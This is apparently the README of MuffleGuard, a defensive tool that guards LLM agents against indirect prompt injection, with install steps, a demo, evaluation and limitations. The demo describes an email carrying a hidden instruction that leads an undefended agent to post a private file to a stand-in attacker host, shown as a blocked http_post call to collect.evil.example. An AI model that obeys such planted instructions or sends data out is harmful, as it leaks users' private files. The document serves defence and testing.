Install

Python 3.11. Nothing else is required to run the tests or the offline demo.

git clone https://github.com/Trafalgar-2006/MuffleGuard
cd MuffleGuard
python -m venv .venv
.venv/Scripts/python -m pip install -r requirements-dev.txt

On Linux or macOS use .venv/bin/python in place of .venv/Scripts/python.

The sentence classifiers are optional and are not downloaded automatically. Without them the policy engine and the hidden-text decoder still run, which is what the headline result measures.

.venv/Scripts/python -m pip install huggingface_hub
.venv/Scripts/hf download protectai/deberta-v3-base-prompt-injection-v2
.venv/Scripts/hf download Horizon-Labs/prompt-injection-guard-small

Run the demo

The same request twice: once with no guard, once with the guard and every content defence switched off.

.venv/Scripts/python tools/hero_attack.py --no-muffle

Undefended, the agent obeys an instruction nobody can see and posts a private file to the attacker. Defended, the model still obeys, and the call is refused:

BLOCK http_post(url='https://collect.evil.example/u', ...)
      The url 'collect.evil.example' came from
      email #5 from hr@corp.example, not from you.

Drop --no-muffle to see the instruction removed before the model reads it, or add --detector to run the classifiers as well.

The Attack Lab

The same story in a browser, with both runs side by side and every step streamed as it happens.

.venv/Scripts/python -m uvicorn web.app:app --port 8000

Set DEMO_TAMPER=1 to expose the button that edits an entry in the audit log, so you can watch verification catch it. There is a live one at attack-lab-production.up.railway.app.

Settings

  • LLM_API_KEY, LLM_BASE_URL, LLM_MODEL — any OpenAI-compatible provider. Without a key the demo replays its recorded run.
  • DEMO_PASSCODE — gates the API. Leave empty for an open demo.
  • DEMO_DAILY_RUNS — a ceiling on live model calls per day; past it the demo replays instead of spending.
  • TRUST_PROXY=1 — only when a platform proxy sits in front, so the rate limit counts the forwarded address.
  • LLM_CACHE=1 — opt in to caching live responses on disk. Off by default.

Reproduce the evaluation

216 runs: eight ordinary tasks crossed with eight attack deliveries, each under three defences. Deterministic, and free.

.venv/Scripts/python -m evaluation.run --adversary

The agent is a deterministic stand-in that obeys every instruction it can actually see. It is not a model and is not presented as one: it measures the guard's own property rather than how gullible a particular model is on a particular day. Because it reads only what the guard let through, muffling genuinely stops it.

Swap --adversary for a real model by configuring a provider; that path needs credit and reports the model it used.

Using the guard

One seam. Every checkpoint goes through it, and nothing else decides anything.

from muffleguard.guard import Event, Guard
from sandbox.tools import DESCRIPTIONS, SPECS

guard = Guard(tools=SPECS, detector=None, descriptions=DESCRIPTIONS)

guard.check(Event(kind="request", text=user_text))
guard.check(Event(kind="tool_result", tool="inbox_read", text=body, label="email #5"))
verdict = guard.check(Event(kind="tool_call", tool="email_send", args=args))
if verdict.decision.value == "block":
    print(verdict.headline)

A tool is described by a ToolSpec that says what it can reach: whether it returns attacker-controlled content, whether it touches private data, whether it can send things out, and which of its arguments name a target. Adding a tool means declaring its reach, never writing a new rule.

Pass descriptions= so the guard pins what each tool claims to do at startup. A description edited afterwards, by a dependency or a compromised MCP server, is refused rather than obeyed.

What it does not claim

  • The audit log is tamper-evident, not tamper-proof. Its recorded head catches a deleted tail, but anyone who can rewrite the database can rewrite both.
  • URL provenance checks the host only. Scheme, port, path, DNS result and redirect destination need separate controls in a real network adapter.
  • An address you paste into your own request is yours. The guard answers who chose a target, and in that case you did.
  • The egress scan is heuristic: recognised secret formats and copied runs of words, not every encoding or paraphrase.
  • Detector thresholds are untuned, so no claim is made about the classifiers. The measured result does not use them.
  • The tools are an in-memory fake world. Real mail, file or HTTP access needs its own authorisation and SSRF protection.

Both known gaps are asserted as they behave in tests/test_redteam.py rather than described as fixed.

Privacy

The detectors are ONNX on the CPU, so content checked by them never leaves the machine. The policy engine consults no model at all.

The agent's own model provider does see the request and the tool results, as any agent's would. Caching those responses to disk is off unless LLM_CACHE=1 is set; the responses committed to demo_cache/ are the synthetic sandbox only.
